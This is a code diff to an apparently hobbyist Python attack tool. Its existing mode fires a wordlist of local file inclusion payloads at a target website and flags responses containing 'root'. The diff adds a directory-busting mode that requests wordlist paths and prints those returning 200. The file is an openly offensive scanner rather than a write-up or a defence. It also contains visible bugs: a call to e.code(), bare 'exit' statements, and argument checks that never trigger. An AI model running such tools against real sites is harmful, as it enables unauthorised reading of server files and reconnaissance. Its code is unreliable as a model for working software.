@@ -1,21 +1,35 @@
 from inspect import ArgSpec
 from sqlite3 import adapt
 import argparse
+from urllib.error import HTTPError
 import urllib.request
+import requests
+
+# Dir busting function
+def getRespCode(url):
+    try:
+        resp = urllib.request.urlopen(url)
+        # print(resp.getcode())
+        if resp.getcode() == 200:
+            print(url)
+    except HTTPError as e:
+        return e.code()
 
 # Init parser
 parser = argparse.ArgumentParser()
 
 # Add Args
-parser.add_argument("-m", "--mode", help="What mode to run leafy on", metavar="MODE", dest="mode", type=str, required=True)
-parser.add_argument("-i", "--ip", help="The IP address of the website you are targeting", metavar="IP", dest="ip", type=str, required=True)
-parser.add_argument("-p", "--port", help="The port the website is running on", metavar="PORT", dest="port", type=str, required=True)
-parser.add_argument("-a", "--path", help="Full path", metavar="PATH", dest="path", type=str, required=True)
-parser.add_argument("-P", "--parameter", help="The parameter to use", metavar="PARAM", dest="param", type=str)
-parser.add_argument("-l", "--list", help="The full path to the list of potential LFI injections", metavar="LIST", dest="list", type=str, required=True)
+parser.add_argument("-m", "--mode", help="What mode to run leafy on", metavar="MODE", dest="mode", type=str, required=True) # Required
+parser.add_argument("-i", "--ip", help="The IP address of the website you are targeting", metavar="IP", dest="ip", type=str) # LFI, DIR
+parser.add_argument("-p", "--port", help="The port the website is running on", metavar="PORT", dest="port", type=str) # LFI, DIR
+parser.add_argument("-a", "--path", help="Full path", metavar="PATH", dest="path", type=str) # LFI, DIR
+parser.add_argument("-P", "--parameter", help="The parameter to use", metavar="PARAM", dest="param", type=str) # LFI
+parser.add_argument("-l", "--list", help="The full path to the wordlist", metavar="LIST", dest="list", type=str) #DIR
 
 # Get the args
 args = parser.parse_args()
+
+# -----------------------------------------------------------------------------------------------------------
 
 # LFI MODE
 if args.mode == "lfi":
@@ -67,10 +81,64 @@ if args.mode == "lfi":
     for line in lines:
         payload = website + line
         resp = urllib.request.urlopen(payload)
-        page = resp.read().decode('utf-8')
-        if "root" in page:
+        # page = resp.read().decode('utf-8')
+        if b'root' in resp.read():
             print(payload)
         else:
             continue
 
+# -----------------------------------------------------------------------------------------------------------
+
 # DIR BUST MODE
+if args.mode == "dir":
+    
+    # Test for required args
+    # Test for IP
+    try:
+        args.ip
+    except:
+        print('You need to indicate an IP to target')
+        exit
+    
+    # Test for port
+    try:
+        args.port
+    except:
+        print("you need to indicate a port to target")
+        exit
+
+    # Test for path
+    try:
+        args.path
+    except:
+        print("you need to indicate a path to target")
+        exit
+    
+    # Test for list
+    try:
+        args.list
+    except:
+        print("you need to indicate a list")
+        exit
+
+    # Define the website
+    website = "http://" + args.ip + ":" + args.port + "/" + args.path + "/"
+
+    # Open list and read all the lines
+    file = open(args.list, 'r')
+    lines = file.readlines()
+
+    # Directory busting
+    for line in lines:
+        payload = website + line
+        try:
+            getRespCode(payload)
+        except:
+            continue
+
+
+
+# -----------------------------------------------------------------------------------------------------------
+
+# Print when script is done
+print("done")
